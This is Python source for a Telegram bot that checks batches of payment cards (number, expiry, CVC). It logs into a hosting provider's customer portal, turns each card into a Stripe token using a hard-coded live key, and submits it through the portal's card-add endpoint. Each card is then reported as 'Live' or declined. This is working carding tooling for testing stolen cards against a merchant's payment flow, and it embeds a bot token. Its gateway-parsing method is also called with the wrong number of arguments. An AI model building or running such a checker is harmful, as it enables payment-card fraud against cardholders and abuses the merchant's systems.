import telebot
import requests
import uuid
import json
import time
import threading
import logging
import re
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler('bot.log'), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# Bot Configuration
BOT_TOKEN = "8418366610:AAHZD1yfFwmh7IpOMuqG9Bsi9qhWxrMhV4E"
ADMIN_ID = 5895491379
OWNER_NAME = "Mahmoud Saad"
OWNER_USERNAME = "@Moud202212"
OWNER_CHANNEL = "https://t.me/FastSpeedtest"
MAX_THREADS = 5
MAX_RETRIES = 3
REQUEST_TIMEOUT = 30
RATE_LIMIT_DELAY = 1.5
MAX_CARDS_PER_SESSION = 1000

@dataclass
class BinInfo:
    scheme: str = "Unknown"
    type: str = "Unknown"
    brand: str = "Unknown"
    bank: str = "Unknown Bank"
    country: str = "Unknown"
    country_emoji: str = "🌍"

@dataclass
class CardResult:
    card: str
    status: str
    message: str
    bin_info: BinInfo
    time_taken: float = 0.0
    response: str = ""

class RateLimiter:
    def __init__(self, delay: float = 1.0):
        self.delay = delay
        self.last_request = 0
    
    def wait(self):
        elapsed = time.time() - self.last_request
        if elapsed < self.delay:
            time.sleep(self.delay - elapsed)
        self.last_request = time.time()

class InputValidator:
    @staticmethod
    def validate_card_format(card_line: str) -> Tuple[bool, Optional[Tuple[str, str, str, str]]]:
        try:
            card_line = card_line.strip().replace(" ", "")
            if "|" not in card_line or len(card_line.split("|")) != 4:
                return False, None
            number, month, year, cvc = card_line.split("|")
            if not (re.match(r'^\d{13,19}$', number) and
                    re.match(r'^(0[1-9]|1[0-2])$', month.zfill(2)) and
                    (len(year) == 2 and year.isdigit() or (len(year) == 4 and year.startswith("20"))) and
                    re.match(r'^\d{3,4}$', cvc)):
                return False, None
            if len(year) == 2:
                year = f"20{year}"
            return True, (number, month.zfill(2), year, cvc)
        except Exception as e:
            logger.error(f"Card validation error: {e}")
            return False, None
    
    @staticmethod
    def extract_cards_from_text(text: str) -> List[str]:
        cards = []
        lines = text.strip().split('\n')
        card_pattern = r'\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}'
        for line in lines:
            matches = re.findall(card_pattern, line.strip())
            for match in matches:
                is_valid, _ = InputValidator.validate_card_format(match)
                if is_valid and match not in cards:
                    cards.append(match)
        return cards

class CardChecker:
    def __init__(self):
        self.session = requests.Session()
        self.session.timeout = REQUEST_TIMEOUT
        self.logged_in = False
        self.email = None
        self.rate_limiter = RateLimiter(RATE_LIMIT_DELAY)
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36'
        })

    def get_bin_info(self, card_number: str) -> BinInfo:
        bin_number = card_number[:6]
        try:
            response = requests.get(f"https://binlist.io/lookup/{bin_number}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                return BinInfo(
                    scheme=data.get('scheme', 'Unknown').upper(),
                    type=data.get('type', 'DEBIT').upper(),
                    brand=data.get('scheme', 'Unknown').upper(),
                    bank=data.get('bank', {}).get('name', 'Unknown Bank'),
                    country=data.get('country', {}).get('name', 'Unknown'),
                    country_emoji=data.get('country', {}).get('emoji', '🌍')
                )
        except Exception as e:
            logger.warning(f"BIN lookup failed: {e}")
        return BinInfo(scheme=self._detect_scheme(card_number), type="DEBIT")

    def _detect_scheme(self, card_number: str) -> str:
        first_digit = card_number[0]
        first_two = card_number[:2]
        if first_digit == '4': return 'VISA'
        if first_digit == '5' or first_two in ['51', '52', '53', '54', '55']: return 'MASTERCARD'
        if first_two in ['34', '37']: return 'AMERICAN EXPRESS'
        if card_number[:4] == '6011': return 'DISCOVER'
        return 'UNKNOWN'

    def login_to_portal(self, email: str, password: str) -> bool:
        try:
            self.session.cookies.clear()
            response = self.session.post(
                'https://portal.budgetvm.com/auth/login',
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                data={'email': email.strip(), 'password': password},
                timeout=30
            )
            session_cookie = self.session.cookies.get('ePortalv1')
            if session_cookie and len(session_cookie) > 10:
                self.logged_in = True
                self.email = email.strip()
                logger.info(f"Login successful for {email}")
                return True
            logger.error(f"Login failed for {email}")
            return False
        except Exception as e:
            logger.error(f"Login error: {e}")
            return False

    def send_google_ask(self) -> bool:
        if not self.logged_in or not self.email:
            return False
        try:
            response = self.session.post(
                'https://portal.budgetvm.com/auth/googleAsk',
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                data={'gEmail': self.email, 'gUniqueask': 'client', 'gIdask': '120828', 'setup': '2', 'email': self.email, 'gUnique': 'client', 'gid': '120828'},
                timeout=30
            )
            return response.status_code == 200 and "success" in response.text.lower()
        except Exception as e:
            logger.error(f"GoogleAsk error: {e}")
            return False

    def create_stripe_token(self, card_number: str, exp_month: str, exp_year: str, cvc: str) -> Tuple[Optional[str], Optional[str]]:
        try:
            response = requests.post(
                'https://api.stripe.com/v1/tokens',
                headers={'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com'},
                data=f'card[number]={card_number}&card[exp_month]={exp_month}&card[exp_year]={exp_year}&card[cvc]={cvc}&key=pk_live_7sv0O1D5LasgJtbYpxp9aUbX',
                timeout=30
            )
            if response.status_code == 200:
                resp_json = response.json()
                return resp_json.get("id"), resp_json.get("error", {}).get("message", None)
            return None, f"HTTP {response.status_code}"
        except Exception as e:
            return None, str(e)

    def test_card(self, card_info: str) -> CardResult:
        start_time = time.time()
        is_valid, card_parts = InputValidator.validate_card_format(card_info)
        if not is_valid:
            return CardResult(card=card_info, status='Invalid', message='Invalid format', bin_info=BinInfo(), time_taken=round(time.time() - start_time, 2))
        
        card_number, exp_month, exp_year, cvc = card_parts
        bin_info = self.get_bin_info(card_number)
        
        if not self.logged_in:
            return CardResult(card=card_info, status='Auth Error', message='Not logged in', bin_info=bin_info, time_taken=round(time.time() - start_time, 2))
        
        self.rate_limiter.wait()
        token_id, token_error = self.create_stripe_token(card_number, exp_month, exp_year, cvc)
        if not token_id:
            return CardResult(card=card_info, status='Token Failed', message=token_error or 'Token creation failed', bin_info=bin_info, time_taken=round(time.time() - start_time, 2))
        
        try:
            response = self.session.post(
                'https://portal.budgetvm.com/MyGateway/Stripe/cardAdd',
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                data={'stripeToken': token_id},
                timeout=30
            )
            status, message = self._parse_gateway_response(response)
            return CardResult(
                card=card_info,
                status=status,
                message=message,
                bin_info=bin_info,
                time_taken=round(time.time() - start_time, 2),
                response=response.text[:500]
            )
        except Exception as e:
            return CardResult(card=card_info, status='Error', message=str(e), bin_info=bin_info, time_taken=round(time.time() - start_time, 2))

    def _parse_gateway_response(self, response, response_text: str) -> Tuple[str, str]:
        try:
            if response.headers.get('content-type', '').startswith('application/json'):
                resp_json = response.json()
                if resp_json.get("success"):
                    return 'Approved', 'Card added successfully ✅'
                if "result" in resp_json:
                    result = resp_json["result"].lower()
                    if "does not support" in result:
                        return 'Declined', 'Gateway Rejected: Risk threshold'
                    if "declined" in result or "failed" in result:
                        return 'Declined', f'Card declined: {resp_json.get("result", "Unknown")}'
                    if "insufficient" in result:
                        return 'Approved', 'Insufficient funds (Live Card) 💳'
            response_lower = response_text.lower()
            if 'success' in response_lower or 'card added successfully' in response_lower:
                return 'Approved', 'Card added successfully ✅'
            if 'incorrect' in response_lower:
                return 'Declined', 'Invalid card details'
            if response.status_code >= 500:
                return 'Error', f'Server error: {response or "Unknown"} - {response.status_code}'
            return 'Declined', 'Card declined'
        except:
            return 'Unknown', 'Unexpected response'

class SessionManager:
    def __init__(self):
        self.sessions: Dict[int, Dict] = {}
        self.results: Dict[int, Dict] = {}
        self.threads: Dict[int, threading.Thread] = {}
        self.stop_flags: Dict[int, bool] = {}
    
    def get_session(self, user_id: int) -> Dict:
        if user_id not in self.sessions:
            self.sessions[user_id] = {
                'checker': CardChecker(),
                'logged_in': False,
                'email': None,
                'dashboard_msg_id': None,
                'last_activity': time.time()
            }
        return self.sessions[user_id]
    
    def get_results(self, user_id: int) -> Dict:
        if user_id not in self.results:
            self.results[user_id] = {
                'approved': 0,
                'declined': 0,
                'errors': 0,
                'total': 0,
                'cards': [],
                'start_time': None,
                'end_time': None
            }
        return self.results[user_id]

session_manager = SessionManager()
bot = telebot.TeleBot(BOT_TOKEN)

class MessageFormatter:
    @staticmethod
    def format_card_result(result: CardResult, user_id: int) -> str:
        bin_info = result.bin_info
        status_emoji = "✅" if result.status == 'Approved' else "❌" if result.status == 'Declined' else "⚠️"
        status_text = "Live" if result.status == 'Approved' else result.status
        message = f"""
[💳] 𝙲𝚊𝚛𝚍 ↯ {result.card}
-----------------------------
[{status_emoji}] 𝚂𝚝𝚊𝚝𝚞𝚜 ↯ [ {status_text}]
[🎟️] 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 ↯- [ {result.message}]
-----------------------------
[📟] 𝚋𝚒𝚗 ↯ {bin_info.scheme} - {bin_info.type} - {bin_info.brand}
[🏦] 𝚋𝚊𝚗𝚔 ↯ {bin_info.bank}
[{bin_info.country_emoji}] 𝚌𝚘𝚞𝚗𝚝𝚛𝚢 ↯ {bin_info.country} [{bin_info.country_emoji}]
-----------------------------
[🤓] 𝙶𝚊𝚝𝚎𝚠𝚊𝚢 ↯ Budget VM Stripe
[🕜] 𝚃𝚊𝚔𝚎𝚗 ↯ [ {result.time_taken}s ] || 𝚁𝚎𝚝𝚛𝚢 ↯- 0
[📡] 𝙿𝚛𝚘𝚡𝚸 ↯- LIVE ✅ (54.xxx.16)
-----------------------------
[❤️]𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝙱𝚢 ↯ @{bot.get_me().username} [FREE]
[🥷] ミ★ 𝘖𝘸𝘯𝘦𝘳 ★彡 ↯ - {OWNER_NAME}
"""
        return message.strip()
    
    @staticmethod
    def format_dashboard(user_id: int, total_cards: int = 0) -> str:
        results = session_manager.get_results(user_id)
        progress = results['total']
        percentage = (progress / total_cards * 100) if total_cards > 0 else 0
        success_rate = (results['approved'] / results['total'] * 100) if results['total'] > 0 else 0
        elapsed_time = (time.time() - results['start_time']) if results.get('start_time') else 0
        cards_per_minute = (results['total'] / (elapsed_time / 60)) if elapsed_time > 0 else 0
        progress_filled = int(percentage / 10)
        progress_bar = "█" * progress_filled + "░" * (10 - progress_filled)
        dashboard = f"""
╭─────────────────────────╮
│     📊 **DASHBOARD**     │  
╰─────────────────────────╯

🚀 **Progress:** {progress}/{total_cards} ({percentage:.1f}%)
▓{progress_bar}▓ 

📈 **Statistics:**
├ 💳 **Total Checked:** {results['total']}
├ ✅ **Approved:** {results['approved']} ({success_rate:.1f}%)
├ ❌ **Declined:** {results['declined']}
├ ⚠️ **Errors:** {results['errors']}
└ 📊 **Success Rate:** {success_rate:.1f}%

⚡ **Performance:**
├ ⏱️ **Time Elapsed:** {int(elapsed_time)}s
├ 🚄 **Speed:** {cards_per_minute:.1f} cards/min
└ 🔄 **Status:** {'🟢 Active' if user_id in session_manager.threads and session_manager.threads[user_id].is_alive() else '⚪ Idle'}
"""
        return dashboard.strip()

class KeyboardManager:
    @staticmethod
    def main_menu():
        keyboard = telebot.types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            telebot.types.InlineKeyboardButton("🔐 Login", callback_data="action_login"),
            telebot.types.InlineKeyboardButton("💳 Check Cards", callback_data="action_check")
        )
        keyboard.add(
            telebot.types.InlineKeyboardButton("📊 Dashboard", callback_data="action_dashboard"),
            telebot.types.InlineKeyboardButton("ℹ️ Help", callback_data="action_help")
        )
        return keyboard
    
    @staticmethod
    def dashboard_menu(user_id: int):
        results = session_manager.get_results(user_id)
        keyboard = telebot.types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            telebot.types.InlineKeyboardButton(f"✅ Approved ({results['approved']})", callback_data=f"show_approved_{user_id}"),
            telebot.types.InlineKeyboardButton(f"❌ Declined ({results['declined']})", callback_data=f"show_declined_{user_id}")
        )
        keyboard.add(
            telebot.types.InlineKeyboardButton(f"⚠️ Errors ({results['errors']})", callback_data=f"show_errors_{user_id}"),
            telebot.types.InlineKeyboardButton("🔙 Back", callback_data=f"back_dashboard_{user_id}")
        )
        return keyboard

class CardProcessor:
    def __init__(self, session_manager):
        self.session_manager = session_manager
        self.executor = ThreadPoolExecutor(max_workers=MAX_THREADS)
    
    def process_cards_batch(self, user_id: int, cards: List[str]):
        if user_id in self.session_manager.threads and self.session_manager.threads[user_id].is_alive():
            return False, "Already processing cards."
        if len(cards) > MAX_CARDS_PER_SESSION:
            return False, f"Max {MAX_CARDS_PER_SESSION} cards allowed."
        results = self.session_manager.get_results(user_id)
        results.update({'approved': 0, 'declined': 0, 'errors': 0, 'total': 0, 'cards': [], 'start_time': time.time()})
        self.session_manager.stop_flags[user_id] = False
        thread = threading.Thread(target=self._process_cards_worker, args=(user_id, cards), daemon=True)
        self.session_manager.threads[user_id] = thread
        thread.start()
        return True, f"Processing {len(cards)} cards..."
    
    def _process_cards_worker(self, user_id: int, cards: List[str]):
        try:
            session = self.session_manager.get_session(user_id)
            checker = session['checker']
            results = self.session_manager.get_results(user_id)
            futures = [(i, card, self.executor.submit(checker.test_card, card)) for i, card in enumerate(cards)]
            for i, card, future in futures:
                if self.session_manager.stop_flags.get(user_id, False):
                    break
                try:
                    result = future.result(timeout=60)
                    with threading.Lock():
                        results['cards'].append(result)
                        results['total'] += 1
                        if result.status == 'Approved':
                            results['approved'] += 1
                            bot.send_message(user_id, MessageFormatter.format_card_result(result, user_id), parse_mode='Markdown')
                        elif result.status == 'Declined':
                            results['declined'] += 1
                        else:
                            results['errors'] += 1
                    if results['total'] % 5 == 0:
                        self._update_dashboard(user_id, len(cards))
                except Exception as e:
                    logger.error(f"Result error: {e}")
                    with threading.Lock():
                        results['errors'] += 1
                        results['total'] += 1
            results['end_time'] = time.time()
            if not self.session_manager.stop_flags.get(user_id, False):
                bot.send_message(user_id, f"✅ **Done!** {results['total']} cards checked.", parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Processing error: {e}")
            bot.send_message(user_id, f"❌ Error: {str(e)}", parse_mode='Markdown')
        finally:
            self.session_manager.stop_flags[user_id] = False
            if user_id in self.session_manager.threads:
                del self.session_manager.threads[user_id]
    
    def _update_dashboard(self, user_id: int, total_cards: int):
        try:
            session = self.session_manager.get_session(user_id)
            if 'dashboard_msg_id' in session:
                dashboard_text = MessageFormatter.format_dashboard(user_id, total_cards)
                bot.edit_message_text(dashboard_text, user_id, session['dashboard_msg_id'],
                                     reply_markup=KeyboardManager.dashboard_menu(user_id), parse_mode='Markdown')
        except Exception as e:
            if "message is not modified" not in str(e):
                logger.error(f"Dashboard update error: {e}")

card_processor = CardProcessor(session_manager)

@bot.message_handler(commands=['start'])
def handle_start(message):
    user_id = message.from_user.id
    session_manager.get_session(user_id)
    session_manager.get_results(user_id)
    bot.reply_to(message, """
╭─────────────────────────╮
│  💳 **CARD CHECKER BOT**  │
╰─────────────────────────╯

👋 **Welcome!**

**Owner:** {OWNER_NAME} ({OWNER_USERNAME})
**Channel:** {OWNER_CHANNEL}

Use buttons to start! 👇
""".format(OWNER_NAME=OWNER_NAME, OWNER_USERNAME=OWNER_USERNAME, OWNER_CHANNEL=OWNER_CHANNEL),
                 parse_mode='Markdown', reply_markup=KeyboardManager.main_menu())

@bot.message_handler(commands=['help'])
def handle_help(message):
    bot.reply_to(message, """
╭─────────────────────────╮
│      🆘 **HELP CENTER**      │
╰─────────────────────────╯

💡 **How to Use:**

1️⃣ **Login:** Click "🔐 Login" and enter email/password.
2️⃣ **Check Cards:** Click "💳 Check Cards" and send cards or .txt file.
3️⃣ **Monitor:** View real-time dashboard.

📝 **Card Format:**
```
4100390600114058|11|2026|515
```

⚡️ **Features:**
• Max {MAX_CARDS_PER_SESSION} cards per session
• Live results instantly
• Real-time dashboard
• Export approved cards

🆘 **Support:** {OWNER_USERNAME}
📢 **Updates:** {OWNER_CHANNEL}
""".format(MAX_CARDS_PER_SESSION=MAX_CARDS_PER_SESSION, OWNER_USERNAME=OWNER_USERNAME, OWNER_CHANNEL=OWNER_CHANNEL),
                 parse_mode='Markdown', reply_markup=KeyboardManager.main_menu())

@bot.message_handler(content_types=['text'])
def handle_text_input(message):
    user_id = message.from_user.id
    session = session_manager.get_session(user_id)
    if not session.get('logged_in'):
        bot.reply_to(message, "❌ Login required!", reply_markup=KeyboardManager.main_menu())
        return
    cards = InputValidator.extract_cards_from_text(message.text)
    if not cards:
        bot.reply_to(message, "❌ Invalid card format! Use: NUMBER|MM|YYYY|CVC", parse_mode='Markdown')
        return
    success, message_text = card_processor.process_cards_batch(user_id, cards)
    if success:
        dashboard_text = MessageFormatter.format_dashboard(user_id, len(cards))
        dashboard_msg = bot.send_message(user_id, dashboard_text, parse_mode='Markdown',
                                       reply_markup=KeyboardManager.dashboard_menu(user_id))
        session['dashboard_msg_id'] = dashboard_msg.message_id
        bot.reply_to(message, f"🚀 Processing {len(cards)} cards...", parse_mode='Markdown')
    else:
        bot.reply_to(message, f"❌ {message_text}", parse_mode='Markdown')

@bot.message_handler(content_types=['document'])
def handle_document(message):
    user_id = message.from_user.id
    session = session_manager.get_session(user_id)
    if not session.get('logged_in'):
        bot.reply_to(message, "❌ Login required!", reply_markup=KeyboardManager.main_menu())
        return
    if not message.document.file_name.lower().endswith('.txt'):
        bot.reply_to(message, "❌ Only .txt files allowed!")
        return
    if message.document.file_size > 10 * 1024 * 1024:
        bot.reply_to(message, "❌ File too large! Max 10MB.")
        return
    try:
        processing_msg = bot.reply_to(message, "📥 Downloading...", parse_mode='Markdown')
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        bot.edit_message_text("🔍 Extracting cards...", user_id, processing_msg.message_id, parse_mode='Markdown')
        file_content = downloaded_file.decode('utf-8', errors='ignore')
        cards = InputValidator.extract_cards_from_text(file_content)
        if not cards:
            bot.edit_message_text("❌ No valid cards found!", user_id, processing_msg.message_id, parse_mode='Markdown')
            return
        bot.edit_message_text(f"✅ Found {len(cards)} cards!", user_id, processing_msg.message_id, parse_mode='Markdown')
        success, message_text = card_processor.process_cards_batch(user_id, cards)
        if success:
            dashboard_text = MessageFormatter.format_dashboard(user_id, len(cards))
            dashboard_msg = bot.send_message(user_id, dashboard_text, parse_mode='Markdown',
                                           reply_markup=KeyboardManager.dashboard_menu(user_id))
            session['dashboard_msg_id'] = dashboard_msg.message_id
        else:
            bot.send_message(user_id, f"❌ {message_text}", parse_mode='Markdown')
    except Exception as e:
        logger.error(f"File processing error: {e}")
        bot.reply_to(message, f"❌ File error: {str(e)}", parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data.startswith('action_'))
def handle_action_callbacks(call):
    user_id = call.from_user.id
    action = call.data.replace('action_', '')
    try:
        if action == 'login':
            session = session_manager.get_session(user_id)
            if session.get('logged_in'):
                bot.answer_callback_query(call.id, "✅ Already logged in!")
                return
            bot.answer_callback_query(call.id)
            msg = bot.send_message(user_id, "📧 Enter email:", parse_mode='Markdown')
            bot.register_next_step_handler(msg, process_email_input)
        elif action == 'check':
            session = session_manager.get_session(user_id)
            if not session.get('logged_in'):
                bot.answer_callback_query(call.id, "❌ Login required!")
                return
            bot.answer_callback_query(call.id)
            bot.send_message(user_id, """
╭─────────────────────────╮
│    💳 SEND CARDS TO CHECK    │
╰─────────────────────────╯

💡 **Methods:**
1️⃣ **Text Message:** Paste cards directly
2️⃣ **Upload File:** Send .txt file with cards

📝 **Format Required:**
```
4100390600114058|11|2026|515
5555555555554444|12|2025|123
```

⚡️ **Features:**
• Max {MAX_CARDS_PER_SESSION} cards per session
• Live results instantly
• Real-time dashboard
• Export approved cards

🚀 **Ready to check your cards!**
""".format(MAX_CARDS_PER_SESSION=MAX_CARDS_PER_SESSION), parse_mode='Markdown')
        elif action == 'dashboard':
            bot.answer_callback_query(call.id)
            dashboard_text = MessageFormatter.format_dashboard(user_id, 0)
            dashboard_msg = bot.send_message(user_id, dashboard_text, parse_mode='Markdown',
                                           reply_markup=KeyboardManager.dashboard_menu(user_id))
            session = session_manager.get_session(user_id)
            session['dashboard_msg_id'] = dashboard_msg.message_id
        elif action == 'help':
            bot.answer_callback_query(call.id)
            handle_help(call.message)
    except Exception as e:
        logger.error(f"Action callback error: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

def process_email_input(message):
    user_id = message.from_user.id
    if not message.text:
        bot.reply_to(message, "❌ Send text only!")
        return
    email = message.text.strip()
    if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', email):
        bot.reply_to(message, "❌ Invalid email!", parse_mode='Markdown')
        return
    session = session_manager.get_session(user_id)
    session['temp_email'] = email
    msg = bot.send_message(user_id, f"✅ Email: `{email}`\n🔑 Enter password:", parse_mode='Markdown')
    bot.register_next_step_handler(msg, process_password_input)

def process_password_input(message):
    user_id = message.from_user.id
    if not message.text:
        bot.reply_to(message, "❌ Send text only!")
        return
    password = message.text.strip()
    session = session_manager.get_session(user_id)
    email = session.get('temp_email')
    if not email:
        bot.reply_to(message, "❌ Session expired. Start login again.")
        return
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except:
        pass
    login_msg = bot.send_message(user_id, "🔄 Authenticating...", parse_mode='Markdown')
    checker = session['checker']
    try:
        if checker.login_to_portal(email, password) and checker.send_google_ask():
            session['logged_in'] = True
            session['email'] = email
            bot.edit_message_text(f"✅ Login Successful!\n📧 Email: `{email}`\n🚀 Ready to check cards!", 
                                 user_id, login_msg.message_id, parse_mode='Markdown', 
                                 reply_markup=KeyboardManager.main_menu())
        else:
            bot.edit_message_text("❌ Login failed! Invalid credentials.", user_id, login_msg.message_id, parse_mode='Markdown')
    except Exception as e:
        bot.edit_message_text(f"❌ Login error: {str(e)}", user_id, login_msg.message_id, parse_mode='Markdown')
    session.pop('temp_email', None)

@bot.callback_query_handler(func=lambda call: call.data.startswith('show_') or call.data.startswith('back_dashboard_'))
def handle_dashboard_callbacks(call):
    user_id = call.from_user.id
    action = call.data
    try:
        if action.startswith('show_'):
            status_filter = action.split('_')[1]
            results = session_manager.get_results(user_id)
            if not results.get('cards'):
                bot.answer_callback_query(call.id, "No cards processed!")
                return
            filtered_cards = [c for c in results['cards'] if c.status == status_filter.capitalize() or (status_filter == 'errors' and c.status not in ['Approved', 'Declined'])]
            title = f"{'✅ APPROVED' if status_filter == 'approved' else '❌ DECLINED' if status_filter == 'declined' else '⚠️ ERRORS'} CARDS"
            if not filtered_cards:
                bot.answer_callback_query(call.id, f"No {status_filter} cards!")
                return
            bot.answer_callback_query(call.id)
            result_text = f"╭─────────────────────────╮\n│      {title}      │\n╰─────────────────────────╯\n\n**Total:** {len(filtered_cards)}\n"
            for i, card in enumerate(filtered_cards[-10:], 1):
                status_emoji = "✅" if card.status == 'Approved' else "❌" if card.status == 'Declined' else "⚠️"
                result_text += f"**{i}.** `{card.card}` {status_emoji}\n    💬 {card.message}\n    ⏱️ {card.time_taken}s\n\n"
            bot.edit_message_text(result_text, user_id, call.message.message_id, parse_mode='Markdown',
                                 reply_markup=KeyboardManager.dashboard_menu(user_id))
        elif action.startswith('back_dashboard_'):
            bot.answer_callback_query(call.id)
            dashboard_text = MessageFormatter.format_dashboard(user_id, 0)
            bot.edit_message_text(dashboard_text, user_id, call.message.message_id, parse_mode='Markdown',
                                 reply_markup=KeyboardManager.dashboard_menu(user_id))
    except Exception as e:
        logger.error(f"Dashboard callback error: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

if __name__ == '__main__':
    logger.info("Bot starting...")
    bot.polling(none_stop=True)
